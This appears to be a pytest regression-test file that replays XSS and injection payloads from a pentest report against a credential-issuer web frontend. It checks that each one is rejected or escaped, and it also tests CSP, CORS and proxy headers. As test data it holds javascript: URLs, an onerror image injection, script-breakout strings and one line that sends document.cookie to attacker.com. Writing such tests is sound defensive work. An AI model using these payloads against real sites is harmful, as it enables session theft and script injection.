"""Regression tests for the 2026-07 pentest findings on the frontend.

Each test posts the attack payload from the report and checks that it is
rejected or rendered harmless.
"""

import json
import re

import pytest

QR = "data:image/png;base64,iVBORw0KGgo="
BACKEND = "https://backend.test"


def _post(client, path, payload):
    return client.post(path, data={"payload": json.dumps(payload)})


def _html(response):
    return response.get_data(as_text=True)


class TestJavascriptUrls:
    """XSS-VULN-01..04 / INJ-VULN-04..08: javascript: URLs in href, form action, onclick, script."""

    @pytest.mark.parametrize("field", ["wallet_dev", "url_data"])
    @pytest.mark.parametrize(
        "value", ["javascript:alert(document.domain)", "JAVASCRIPT:alert(1)", "data:text/html,<script>x</script>", "x\" onmouseover=\"y"]
    )
    def test_credential_offer_qr_code(self, client, field, value):
        payload = {"wallet_dev": "https://tester.test/offer", "url_data": "openid-credential-offer://x", "credential_offer": {}, "qrcode": QR}
        payload[field] = value
        response = _post(client, "/display_credential_offer_qr_code", payload)
        assert response.status_code == 400
        assert "javascript:" not in _html(response).lower()

    def test_credential_offer_qr_code_valid(self, client):
        offer = {"credential_issuer": "https://fe.test", "grants": {"x": "a&b"}}
        response = _post(
            client,
            "/display_credential_offer_qr_code",
            {"wallet_dev": "https://tester.test/offer", "url_data": "openid-credential-offer://?credential_offer=x", "credential_offer": offer, "qrcode": QR, "tx_code": 12345, "code": "c"},
        )
        assert response.status_code == 200
        html = _html(response)
        href = re.search(r'href="(https://tester\.test/offer\?[^"]*)"', html).group(1)
        # Query built with urlencode: the offer JSON cannot break out of its parameter.
        assert "code=c&amp;tx_code=12345&amp;credential_offer=%7B" in href

    @pytest.mark.parametrize("qrcode", ["javascript:alert(1)", "https://attacker.test/x.png", "data:image/svg+xml;base64,PHN2Zz4="])
    def test_qr_code_must_be_png_data_uri(self, client, qrcode):
        response = _post(
            client,
            "/display_credential_offer_qr_code",
            {"wallet_dev": "https://tester.test/offer", "url_data": "openid-credential-offer://x", "credential_offer": {}, "qrcode": qrcode},
        )
        assert response.status_code == 400

    @pytest.mark.parametrize(
        "field, value",
        [
            ("redirect_url", "javascript:alert(document.domain)"),
            ("redirect_url", "https://attacker.test/revoke"),
            ("revocation_choice_url", "javascript:alert(document.domain)"),
            ("revocation_choice_url", "http://x/';fetch('https://attacker.com/?c='+document.cookie)//"),
        ],
    )
    def test_revocation_authorization(self, client, field, value):
        payload = {
            "revocation_identifier": "id",
            "redirect_url": f"{BACKEND}/revocation/revoke",
            "revocation_choice_url": f"{BACKEND}/revocation/revocation_choice",
            "display_list": {},
        }
        payload[field] = value
        response = _post(client, "/display_revocation_authorization", payload)
        assert response.status_code == 400

    def test_revocation_authorization_has_no_inline_handler(self, client):
        response = _post(
            client,
            "/display_revocation_authorization",
            {
                "revocation_identifier": "id",
                "redirect_url": f"{BACKEND}/revocation/revoke",
                "revocation_choice_url": f"{BACKEND}/revocation/revocation_choice",
                "display_list": {},
            },
        )
        html = _html(response)
        assert response.status_code == 200
        assert "onclick=\"window.location" not in html
        assert f'href="{BACKEND}/revocation/revocation_choice"' in html

    @pytest.mark.parametrize(
        "field, value",
        [
            ("redirect_url", "javascript:fetch(document.cookie)//"),
            ("url_data", "javascript:alert(document.domain)"),
            ("qrcode", "javascript:alert(1)"),
        ],
    )
    def test_revocation_qr_code(self, client, field, value):
        payload = {"presentation_id": "tx", "redirect_url": f"{BACKEND}/", "url_data": "eudi-openid4vp://x", "qrcode": QR}
        payload[field] = value
        assert _post(client, "/display_revocation_qr_code", payload).status_code == 400

    def test_revocation_qr_code_script_values_are_json_encoded(self, client):
        response = _post(
            client,
            "/display_revocation_qr_code",
            {"presentation_id": "a'</script><script>alert(1)</script>", "redirect_url": f"{BACKEND}/", "url_data": "eudi-openid4vp://x", "qrcode": QR},
        )
        html = _html(response)
        assert response.status_code == 200
        assert "<script>alert(1)" not in html
        assert 'var presentation_id = "a\\u0027\\u003c/script\\u003e' in html

    @pytest.mark.parametrize(
        "path, url_field",
        [
            ("/display_auth_method", "redirect_url"),
            ("/display_form", "redirect_url"),
            ("/display_authorization", "redirect_url"),
            ("/display_credential_offer", "redirect_url"),
            ("/display_revocation_choice", "redirect_url"),
        ],
    )
    @pytest.mark.parametrize("value", ["javascript:alert(1)//", "https://attacker.test/", None])
    def test_form_actions_must_be_on_the_backend(self, client, path, url_field, value):
        payload = {url_field: value, "mandatory_attributes": {}, "optional_attributes": {}, "presentation_data": {}, "cred": {}}
        assert _post(client, path, payload).status_code == 400

    @pytest.mark.parametrize(
        "path", ["/display_auth_method", "/display_form", "/display_authorization", "/display_credential_offer", "/display_revocation_choice"]
    )
    def test_form_actions_on_the_backend_are_accepted(self, client, path):
        payload = {"redirect_url": f"{BACKEND}/", "mandatory_attributes": {}, "optional_attributes": {}, "presentation_data": {}, "cred": {}}
        assert _post(client, path, payload).status_code == 200

    def test_pid_login_deeplink_and_script(self, client):
        bad = _post(client, "/display_pid_login", {"deeplink_url": "javascript:alert(1)", "qr_img_base64": QR, "transaction_id": "t"})
        assert bad.status_code == 400
        good = _post(client, "/display_pid_login", {"deeplink_url": "eudi-openid4vp://v?x=1", "qr_img_base64": QR, "transaction_id": "t'\"<"})
        html = _html(good)
        assert good.status_code == 200 and 'var presentation_id = "t\\u0027\\"\\u003c";' in html


class TestDomXss:
    """New finding: attribute names reached innerHTML in dynamic-form.html."""

    def test_form_script_uses_no_inner_html_with_names(self, client):
        response = _post(
            client,
            "/display_form",
            {
                "redirect_url": f"{BACKEND}/dynamic/form",
                "mandatory_attributes": {},
                "optional_attributes": {'"><img src=x onerror=alert(1)>': {"type": "string"}},
            },
        )
        html = _html(response)
        assert response.status_code == 200
        assert "<img src=x onerror" not in html
        assert "innerHTML = `" not in html


class TestInternalError:
    def test_status_code_is_not_taken_from_the_payload(self, client):
        response = _post(client, "/internal_error", {"error": "<b>x</b>", "error_code": "E", "error_type": 302})
        assert response.status_code == 500
        assert "<b>x</b>" not in _html(response)


class TestHeadersAndCors:
    """No CSP, credentialed CORS reflecting any origin, SECRET_KEY='dev'."""

    def test_security_headers(self, client):
        headers = client.get("/").headers
        csp = headers["Content-Security-Policy"]
        assert "frame-ancestors 'none'" in csp and "form-action 'self' https://backend.test" in csp
        assert "object-src 'none'" in csp and "base-uri 'none'" in csp
        assert headers["X-Content-Type-Options"] == "nosniff"
        assert headers["X-Frame-Options"] == "DENY"

    def test_no_credentialed_cors(self, client):
        response = client.post(
            "/display_revocation_success", headers={"Origin": "https://attacker.test"}
        )
        assert "Access-Control-Allow-Credentials" not in response.headers
        assert response.headers.get("Access-Control-Allow-Origin") is None

    def test_metadata_is_readable_cross_origin_without_credentials(self, client):
        response = client.get("/.well-known/openid-credential-issuer", headers={"Origin": "https://wallet.test"})
        assert response.headers["Access-Control-Allow-Origin"] == "*"
        assert "Access-Control-Allow-Credentials" not in response.headers

    def test_no_session_cookie_or_secret(self, app, client):
        assert not app.config.get("SECRET_KEY")
        response = _post(client, "/display_pid_login", {"deeplink_url": "eudi-openid4vp://v", "qr_img_base64": QR, "transaction_id": "t"})
        assert "Set-Cookie" not in response.headers


class TestParProxy:
    def test_only_safe_upstream_headers_are_relayed_and_errors_are_generic(self, client, monkeypatch):
        from unittest import mock

        import requests

        upstream = mock.Mock(status_code=201, content=b'{"request_uri":"u"}')
        upstream.headers = {"Content-Type": "application/json", "Transfer-Encoding": "chunked", "Set-Cookie": "x=1", "DPoP-Nonce": "n"}
        monkeypatch.setattr(requests, "post", mock.Mock(return_value=upstream))
        response = client.post("/pushed_authorization", data={"client_id": "w"})
        assert response.status_code == 201
        assert response.headers["DPoP-Nonce"] == "n"
        assert "Transfer-Encoding" not in response.headers and "Set-Cookie" not in response.headers

        monkeypatch.setattr(requests, "post", mock.Mock(side_effect=requests.ConnectionError("secret internal host:5000")))
        failure = client.post("/pushed_authorization", data={"client_id": "w"})
        assert failure.status_code == 502 and "secret internal host" not in failure.get_data(as_text=True)
